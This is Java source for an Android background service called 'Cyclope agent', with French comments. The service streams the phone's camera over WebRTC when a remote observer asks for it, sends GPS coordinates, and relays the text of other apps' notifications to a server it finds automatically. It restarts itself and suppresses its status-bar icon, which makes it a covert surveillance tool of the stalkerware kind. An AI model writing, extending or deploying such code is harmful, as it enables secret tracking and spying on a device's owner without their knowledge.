package com.example.cyclope;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;

public class CyclopeService extends Service {

    static {
        System.loadLibrary("cyclope");
    }

    private static final String TAG        = "CyclopeService";
    private static final String CHANNEL_ID = "cyclope_agent_v2";
    private static final int    NOTIF_ID   = 1;

    private WebRtcClient    webRtcClient;
    private ServerDiscovery serverDiscovery;
    private CaptationGPS    captationGPS;

    // ── Méthodes natives (NDK) ──────────────────────────────────────────────────
    private native void nativeStart();
    private native void nativeStop();
    private native void nativeFlipCamera();
    private native void nativeSetWebRtcCallback(Object cb);
    private native void nativeSetGpsData(double lat, double lon, double alt, float accuracy);
    private native void nativeSetTargetFps(int fps);

    // ── Cycle de vie du service ─────────────────────────────────────────────────

    static final String PREFS_CRASHES = "cyclope_crashes";

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        installCrashHandler();
    }

    private void installCrashHandler() {
        final Thread.UncaughtExceptionHandler original = Thread.getDefaultUncaughtExceptionHandler();
        Thread.setDefaultUncaughtExceptionHandler((thread, ex) -> {
            try {
                String trace = Log.getStackTraceString(ex);
                getSharedPreferences(PREFS_CRASHES, MODE_PRIVATE).edit()
                        .putString("crash_msg",   ex.toString())
                        .putString("crash_trace", trace)
                        .putLong  ("crash_ts",    System.currentTimeMillis())
                        .apply();
                Log.e(TAG, "CRASH non géré — sauvegardé", ex);
            } catch (Exception ignored) {}
            if (original != null) original.uncaughtException(thread, ex);
        });
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIF_ID, buildNotification());
        Log.i(TAG, "Agent démarré");

        String deviceId   = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceName = Build.MANUFACTURER + " " + Build.MODEL;

        webRtcClient = new WebRtcClient(this, deviceId, deviceName);
        webRtcClient.setFlipListener(this::nativeFlipCamera);

        // Le NDK reçoit les frames caméra et les pousse dans le pipeline WebRTC
        nativeSetWebRtcCallback(webRtcClient);

        // La caméra démarre seulement quand un observateur le demande (request-offer)
        webRtcClient.setCaptureListener(new WebRtcClient.CaptureListener() {
            @Override public void onStartCapture()        { nativeStart(); }
            @Override public void onStopCapture()         { nativeStop(); }
            @Override public void onSetTargetFps(int fps) { nativeSetTargetFps(fps); }
        });

        CaptationNotification.sListener = (appName, title, text) -> {
            if (webRtcClient != null) webRtcClient.sendNotification(appName, title, text);
        };

        captationGPS = new CaptationGPS(this, (lat, lon, alt, acc) -> {
            nativeSetGpsData(lat, lon, alt, acc);
            if (webRtcClient != null) webRtcClient.sendGps(lat, lon, alt, acc);
        });
        captationGPS.start();

        serverDiscovery = new ServerDiscovery();
        serverDiscovery.start(this, url -> webRtcClient.init(url));
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "Agent arrêté");

        CaptationNotification.sListener = null;
        if (serverDiscovery != null) serverDiscovery.stop();
        if (captationGPS    != null) captationGPS.stop();
        nativeStop();
        nativeSetWebRtcCallback(null);
        if (webRtcClient != null) webRtcClient.release();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── Notification persistante ────────────────────────────────────────────────

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Cyclope Agent",
                    NotificationManager.IMPORTANCE_MIN); // aucune icône dans la barre de statut
            channel.setDescription("Agent Cyclope actif");
            channel.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification buildNotification() {
        Intent openApp = new Intent(this, MainActivity.class);
        PendingIntent pi = PendingIntent.getActivity(this, 0, openApp,
                PendingIntent.FLAG_IMMUTABLE);
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Cyclope")
                .setContentText("Agent actif")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pi)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setSilent(true)
                .build();
    }

    // ── Helpers statiques pour l'Activity ───────────────────────────────────────

    public static void start(Context ctx) {
        Intent intent = new Intent(ctx, CyclopeService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            ctx.startForegroundService(intent);
        } else {
            ctx.startService(intent);
        }
    }

    public static void stop(Context ctx) {
        ctx.stopService(new Intent(ctx, CyclopeService.class));
    }
}